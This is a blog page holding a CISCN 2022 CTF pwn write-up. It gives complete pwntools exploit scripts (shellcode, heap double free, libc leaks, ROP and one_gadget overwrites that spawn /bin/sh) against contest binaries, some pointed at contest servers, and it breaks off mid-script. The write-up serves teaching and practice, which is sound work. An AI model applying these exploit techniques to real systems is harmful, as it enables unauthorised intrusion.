<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="7r1p13J">





<title>ciscn2022初赛&amp;华南复赛 | Hexo</title>



    <link rel="icon" href="/github-11-48.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ciscn2022初赛&amp;华南复赛</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">August 1, 2022&nbsp;&nbsp;11:28:05</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/CTF/">CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>vmpwn+shellcode，拿到root权限后直接发送即可</p>
<p>shellcode来源<a target="_blank" rel="noopener" href="https://hama.hatenadiary.jp/entry/2017/04/04/190129%EF%BC%8C%E5%B0%86rax%E4%BF%AE%E6%94%B9%E4%B8%BArdx%EF%BC%88%E6%9C%AC%E9%A2%98call">https://hama.hatenadiary.jp/entry/2017/04/04/190129，将rax修改为rdx（本题call</a> shellcode的寄存器为rdx）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./login&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;59.110.105.63&#x27;</span>,<span class="number">41076</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_vm</span>(<span class="params">code</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.send(code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#code =</span></span><br><span class="line">code =  <span class="string">b&quot;msg:&quot;</span>+<span class="string">b&#x27;ro0ta\n&#x27;</span>+<span class="string">b&quot;opt:&quot;</span>+<span class="string">b&#x27;1\n\n&#x27;</span></span><br><span class="line">run_vm(code)</span><br><span class="line">code =  <span class="string">b&quot;msg:&quot;</span>+<span class="string">b&#x27;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAa\n&#x27;</span>+<span class="string">b&quot;opt:&quot;</span>+<span class="string">b&#x27;2\n\n&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xEC9)&#x27;)</span></span><br><span class="line">run_vm(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h1><p>2.34版本的堆题，没有free_hook和malloc_hoook,故利用类似orw的方式，打栈的ret返回地址。</p>
<p>mmap申请极大的堆到libc段之上（malloc的是低位，而pagesnum是整个高位），show没有检查边界，可以通过show来泄露libc</p>
<p>存在UAF，故可以使用double free，没有edit，故考虑fastbin double free，实现任意地址写  </p>
<p>利用environ指针泄露出栈地址，然后申请到栈上写返回地址ROP即可（onegadget没打通）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;newest_note&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;How many pages your notebook will be? :&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x40010000</span>).rjust(<span class="number">19</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,data</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;4. Exit&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;1&quot;</span>.rjust(<span class="number">19</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(idx).rjust(<span class="number">19</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;4. Exit&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;2&quot;</span>.rjust(<span class="number">19</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(idx).rjust(<span class="number">19</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;4. Exit&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;3&quot;</span>.rjust(<span class="number">19</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(idx).rjust(<span class="number">19</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">show(<span class="number">0x537F5</span>)<span class="comment">#env</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x158</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">show(<span class="number">0x537F5</span>-<span class="number">0xc</span>)<span class="comment">#stdin</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x218a80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">6</span>-i)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)+<span class="string">b&#x27;\x00\x00\x00&#x27;</span>)*<span class="number">0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,p64(<span class="built_in">int</span>(heap/<span class="number">0x1000</span>) ^ stack))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0x14A4)&#x27;</span>)</span><br><span class="line">one = [<span class="number">0xeeccc</span>,<span class="number">0xeeccf</span>,<span class="number">0xeecd2</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002e6c5</span></span><br><span class="line">execvp = libc_base + <span class="number">0xEE844</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1DBCBA</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(pop_rdi)+p64(bin_sh)+p64(execvp))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另一种解法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">堆菜单存在exit，故考虑打exit劫持流程。</span><br><span class="line"></span><br><span class="line">申请大堆块来利用show的越界泄露libc基地址，利用UAF来泄露堆地址，利用doublefree申请到exit_hook附近，此exithook为动调exit时找到的一个可以的call的函数地址，将其修改为onegadget即可，tcache申请有检查对齐，故从exit_hook-0x8开始写即可通过检查。</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;newest_note&quot;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p.recvuntil(&quot;How many pages your notebook will be? :&quot;)</span><br><span class="line">p.sendline(str(0x40010000))</span><br><span class="line"></span><br><span class="line">def add(idx,Content):</span><br><span class="line">    p.sendlineafter(&#x27;: &#x27;,&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">    p.sendafter(&#x27;Content: &#x27;,Content)</span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendlineafter(&#x27;: &#x27;,&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    p.sendlineafter(&#x27;: &#x27;,&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">def pwn():</span><br><span class="line">    #leak libc  (stdin)</span><br><span class="line">    show(0x537F5-0xc)</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) - 0x218a80</span><br><span class="line">    exit_hook=libc_base+0x21a6c0 #exit_hook-&gt;onegadget</span><br><span class="line"></span><br><span class="line">    for i in range(10):</span><br><span class="line">        add(i,&#x27;wow&#x27;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        free(6-i)</span><br><span class="line">    show(6)</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    heap_base = u64(p.recv(5).ljust(8,b&#x27;\x00&#x27;))&lt;&lt;12</span><br><span class="line"></span><br><span class="line">    free(7)</span><br><span class="line">    free(8)</span><br><span class="line">    free(7)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        add(i,&#x27;wow&#x27;)</span><br><span class="line">    add(7,p64(int(heap_base&gt;&gt;12) ^ exit_hook))</span><br><span class="line">    add(8,&#x27;wow&#x27;)</span><br><span class="line">    add(10,&#x27;wow&#x27;)</span><br><span class="line"></span><br><span class="line">    #gdb.attach(p,&#x27;b *$rebase(0x14A4)&#x27;)</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">    constraints:</span><br><span class="line">      [r15] == NULL || r15 == NULL</span><br><span class="line">      [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">    0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">    constraints:</span><br><span class="line">      [r15] == NULL || r15 == NULL</span><br><span class="line">      [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">    0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">    constraints:</span><br><span class="line">      [rsi] == NULL || rsi == NULL</span><br><span class="line">      [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    add(0,p64(0xeeccc+libc_base)+p64(0xeeccc+libc_base))</span><br><span class="line">    print(hex(heap_base))</span><br><span class="line">    print(hex(libc_base))</span><br><span class="line">    p.recvuntil(&quot;4. Exit&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    pwn()</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"># </span><br></pre></td></tr></table></figure>

<h2 id="chats-store"><a href="#chats-store" class="headerlink" title="chats_store"></a>chats_store</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">from pwn import *</span><br><span class="line">p=prcess(&#x27;./chats_store&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">p.interactive()</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">elf=ELF(&#x27;./chats_store&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;No. &gt; &#x27;,str(idx))</span><br><span class="line">    p.sendlineafter(&#x27;size&gt; &#x27;,str(size))</span><br><span class="line">    p.sendafter(&#x27;chats&gt; &#x27;,content)</span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;No. &gt; &#x27;,str(idx))</span><br><span class="line">#0x7fcec24d05dd  sdtout-0x43</span><br><span class="line">def pwn():</span><br><span class="line">    add(0,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(1,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(3,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(4,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(5,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(6,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(7,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(8,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(9,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(10,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(11,0x28,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(12,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(13,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(14,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    #####</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,0x68,b&#x27;\x00&#x27;*0x68+b&#x27;\xe1&#x27;)</span><br><span class="line">    free(1)</span><br><span class="line">    add(1,0x68,b&#x27;\xdd\x65&#x27;)</span><br><span class="line">    free(4)</span><br><span class="line">    free(5)</span><br><span class="line">    free(4)</span><br><span class="line">    add(4,0x68,b&#x27;\x70\xb0&#x27;)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    add(5,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    add(5,0x68,b&#x27;aaaa&#x27;)#unsorted</span><br><span class="line">    add(6,0x68,b&#x27;aaaa&#x27;)</span><br><span class="line">    payload=b&#x27;\x00&#x27;*0x33</span><br><span class="line">    payload+=p64(0xfadb1887)+p64(0)*3+b&#x27;\x88&#x27;</span><br><span class="line">    add(6,0x68,payload)</span><br><span class="line">    libc_base=u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x3c48e0</span><br><span class="line">    free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">    malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">    realloc=libc_base+libc.sym[&#x27;realloc&#x27;]</span><br><span class="line">    success(hex(libc_base))</span><br><span class="line">    usbattack=free_hook-0x10</span><br><span class="line">    #add(15,0)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">    constraints:</span><br><span class="line">      rax == NULL</span><br><span class="line"></span><br><span class="line">    0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">    constraints:</span><br><span class="line">      [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">    0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">    constraints:</span><br><span class="line">      [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">    0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">    constraints:</span><br><span class="line">      [rsp+0x70] == NULL</span><br><span class="line"></span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    onegadget=libc_base+0x4527a</span><br><span class="line">    #push -8</span><br><span class="line">    free(7)</span><br><span class="line">    free(8)</span><br><span class="line">    free(7)</span><br><span class="line">    add(7,0x68,p64(malloc_hook-0x23))</span><br><span class="line">    add(8,0x68,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">    add(9,0x68,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">    payload=b&#x27;\x00&#x27;*(11)+p64(onegadget)+p64(realloc+0xd)+b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">    add(10,0x68,payload)</span><br><span class="line">    p.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;No. &gt; &#x27;,str(11))</span><br><span class="line">    p.sendlineafter(&#x27;size&gt; &#x27;,str(0x68))</span><br><span class="line">    p.interactive()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    while True:</span><br><span class="line">        #p=process(&#x27;./chats_store&#x27;)</span><br><span class="line">        p=remote(&#x27;43.138.52.3&#x27;,53000)</span><br><span class="line">        try:</span><br><span class="line">            pwn()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure>

<h2 id="print-hhh"><a href="#print-hhh" class="headerlink" title="print_hhh"></a>print_hhh</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">from time import sleep </span><br><span 